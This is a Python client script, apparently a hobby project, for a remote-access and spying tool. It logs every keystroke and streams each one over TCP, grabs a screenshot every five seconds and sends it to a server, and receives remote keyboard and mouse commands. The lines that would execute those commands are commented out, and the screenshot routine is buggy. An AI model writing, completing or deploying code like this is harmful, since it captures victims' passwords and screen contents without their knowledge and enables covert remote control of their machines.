import keyboard
import socket
import sys
from PIL import ImageGrab
import time
import io
import win32api
import json
host = '127.0.0.1'
def send_message_to_server(client_socket,message):
    print("Sending")
    client_socket.sendall(message.encode())
def print_pressed_keys(key, client_socket):
    print("Pressed: ", key.name)
    message = f"Key pressed: {key.name}"
    send_message_to_server(client_socket,message)
def return_image_size(image):
    image_data = io.BytesIO()
    image.save(image_data, format='PNG')
    image_size = image_data.tell()
    image_data.close()
    return str(image_size)
def send_screenshot():
    port = 5003
    # Create a TCP/IP socket
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect to the server
    client_socket.connect((host, port))

    while True:
            # Take a screenshot using PIL
         screenshot = ImageGrab.grab()
         image_data = io.BytesIO()
         screenshot.save(image_data, format='JPEG')
         image_data = image_data.getvalue()
         # Send the screenshot to the server
         client_socket.sendall(return_image_size(image_data).encode())
         client_socket.sendall(image_data)

            # Wait for some time before taking the next screenshot
         time.sleep(5)
#send_screenshot() #run screenshot fucntion
def keyboard_controlled():
    port = 5001
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    print("Connected with server")
    while True:
        key = s.recv(1024).decode()
        if key != "":
         print("Press key - > ",key)
         #keyboard.press_and_release(key)
        else:
            print("connection lost with server")
            s.close()
            break
def mouse_controlled():
    port = 5002
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = "test"
    data = data.encode()
    s.sendto(data,(host,port))
    print("Sent message to server")
    s.settimeout(5)
    try: 
        while True:
            mouse_location_binary = s.recvfrom(1024)
            mouse_location = json.loads(mouse_location_binary[0].decode())
            print("Recived tuple: ", mouse_location)
            x = mouse_location[0]
            y = mouse_location[1]
            print(f"X = {x}, Y = {y}")
            #win32api.SetCursorPos(x,y)
            #else:
            #  s.close()
            #   break
    except socket.timeout:
        print("Server stopped sending packets. Exiting...")
        s.close()
        sys.exit()


    

def keylogger():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 5000
    connection_successful = False
    s.connect((host, port))
    print("Connected")
    connection_successful = True
    def on_key_pressed(key):
        print_pressed_keys(key, s)
    keyboard.on_press(on_key_pressed)
    if not connection_successful:
        print("Failed to connect to the server")
        s.close()
        sys.exit()
    keyboard.wait('esc')
    s.close()
def main():
    #keylogger()
    #keyboard_controlled()
    mouse_controlled()
if __name__ == "__main__":
    main()   

